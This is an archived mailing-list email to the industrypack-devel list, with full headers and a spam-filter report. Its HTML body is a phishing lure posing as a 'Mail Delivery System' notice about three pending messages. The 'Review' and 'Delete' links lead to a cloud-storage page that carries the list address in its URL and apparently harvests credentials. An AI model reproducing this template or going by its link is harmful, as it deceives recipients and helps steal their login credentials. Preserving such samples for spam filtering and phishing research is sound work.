Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E75E9B55786
	for <lists+industrypack-devel@lfdr.de>; Fri, 12 Sep 2025 22:16:42 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=cW0UMfqZEKxG6ksBq9tGbP3P0a1LSxISjCRcG/ulnJg=; b=RgQTdrKHI8rYit0/+PVRF+if9v
	U/yvj23ha2lL1Tmo6+SmnwMOVsA+/4VzrrKQLE1qmVm5RImCiC8BTOQ3IfJ6X/8oNPVmBe5FMB4vq
	XwueDpeaWKvXBtqj9fCsHFHjIJoBI4dwjRg2oCFUPQzvxzYoL5xWTpDwm247iChuu8Ro=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1uxACG-0007SO-VI
	for lists+industrypack-devel@lfdr.de;
	Fri, 12 Sep 2025 20:16:41 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mailer-daemon@host2.i4dots.com>) id 1uxACE-0007S9-NZ
 for industrypack-devel@lists.sourceforge.net;
 Fri, 12 Sep 2025 20:16:39 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=4+74SjjGGSvyA2fs+8MIWwzo4PdpeBWzeR6gx+xdXpA=; b=gfdBqX55oRLdeLblstn/IX34OU
 G0PLUlqOp4PiCicXaj09m+PCwFSkWItl2EE7QrUHl3KOZz7xKymtnPvOXKx1CtJCIjtYGcQLQKcJR
 15FA0amuhh2gNJ00jQBp2jbG+tePPbmrfdaaO9F/qe1HWS2mKIvvgS8k0bUVqag+spms=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=4+74SjjGGSvyA2fs+8MIWwzo4PdpeBWzeR6gx+xdXpA=; b=h
 1tRv6cd+mgzo5o0gL2XO7B/X5K5UFSVzrhKFQOwggpn9SGocrwjQNi/caInSjzOjIR9NeJvpHxeDg
 4P/Zc/kRO/Jz+EE5GLtyuLCtSWHW+urq6lKfwhgbr5PF75LbHc8d3nXsSU96Eo6fzp8Cp1H0doOcc
 Vg69awKBq3eVHGyw=;
Received: from [172.245.23.164] (helo=172-245-23-164-host.colocrossing.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uxACF-0002BR-1W for industrypack-devel@lists.sourceforge.net;
 Fri, 12 Sep 2025 20:16:39 +0000
From: Mail Delivery System <mailer-daemon@host2.i4dots.com>
To: industrypack-devel@lists.sourceforge.net
Date: 12 Sep 2025 22:16:33 +0200
Message-ID: <20250912221633.097BC54C67391B09@host2.i4dots.com>
MIME-Version: 1.0
X-Spam-Score: 5.3 (+++++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Can’t reach this page Message from industrypack-devel@lists.sourceforge.net
    server 
 
 Content analysis details:   (5.3 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
  0.0 HTML_MESSAGE           BODY: HTML included in message
  3.9 HELO_DYNAMIC_IPADDR2   Relay HELO'd using suspicious hostname (IP addr
                             2)
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1uxACF-0002BR-1W
Subject: [Industrypack-devel] =?utf-8?q?=5BSPAM=5D_Email_Notification=3A_Y?=
 =?utf-8?q?ou_have_=283=29_pending_mess=C9=91ges?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============0967660049925350000=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============0967660049925350000==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<title>Can&#8217;t reach this page</title><link href=3D"NewErrorPageTemplat=
e.css" rel=3D"stylesheet" type=3D"text/css">
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8">
<script language=3D"javascript" src=3D"errorPageStrings.js" type=3D"text/ja=
vascript">
        </script>

<script language=3D"javascript" src=3D"httpErrorPagesScripts.js" type=3D"te=
xt/javascript">
        </script>

<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
<body onload=3D"javascript:getInfo();">
<p>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
or: rgb(2, 151, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;industrypack-devel@lists.sourceforge.net server<=
/span></td></tr></tbody></table><p></p>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; float: none; display: inline !important; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"></span>&nbsp;</div>
<p align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; te=
xt-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; fo=
nt-size: 13px; font-style: normal; font-weight: 400; margin-top: 0px; word-=
spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wido=
ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
n-thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;"><font color=3D"#000066" face=3D"Arial" siz=
e=3D"4" style=3D"box-sizing: border-box;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;">Messages Delivery Failure</strong></font></p>=

<div align=3D"left" class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=
=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none; white-space: normal; b=
ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><font size=3D"3"><font style=3D"box-sizing: border-box;"><span st=
yle=3D"box-sizing: border-box;">The delivery of messages was stopped by the=
&nbsp;lists.sourceforge.net Mail-Server.</span><br style=3D"box-sizing: bor=
der-box;"><span style=3D"box-sizing: border-box;">You have 3 pending messag=
es that could not be sent as of 9/12/2025 10:16:33 p.m.</span></font>
 <br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
">
<span style=3D"box-sizing: border-box;"><font style=3D"box-sizing: border-b=
ox;">Click to&nbsp;</font>
 <a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0p=
x; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-a=
lign: baseline; cursor: pointer; box-sizing: border-box; background-color: =
transparent;" href=3D"https://storage.googleapis.com/veri01/aspx.html#indus=
trypack-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"noreferrer">
<font face=3D"Arial" style=3D"box-sizing: border-box;"><u>Review</u></font>=
</a><font style=3D"box-sizing: border-box;">&nbsp;</font><font style=3D"box=
-sizing: border-box;">or</font><span>&nbsp;</span>
 <a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0p=
x; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-a=
lign: baseline; cursor: pointer; box-sizing: border-box; background-color: =
transparent;" href=3D"https://storage.googleapis.com/veri01/aspx.html#indus=
trypack-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"noreferrer">
<font face=3D"Arial" style=3D"box-sizing: border-box;"><u>Delete</u></font>=
</a><span>&nbsp;</span><font style=3D"box-sizing: border-box;">pending outg=
oing e-mail messages.</font></span></font></div>
<div align=3D"left" class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=
=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none; white-space: normal; b=
ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><font size=3D"3"><span style=3D"box-sizing: border-box;"></span><=
/font>&nbsp;</div>
<div class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align: =
left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; lette=
r-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-s=
tyle: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bord=
er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;"><span style=3D"color: black; box-=
sizing: border-box;"><font size=3D"3">Thanks,</font></span></div>
<div class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align: =
left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; lette=
r-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-s=
tyle: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bord=
er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;"><span style=3D"color: black; box-sizing: bord=
er-box;"><font size=3D"3">Mail&nbsp;Administrator</font></span></strong></d=
iv></body></html>


--===============0967660049925350000==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0967660049925350000==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0967660049925350000==--
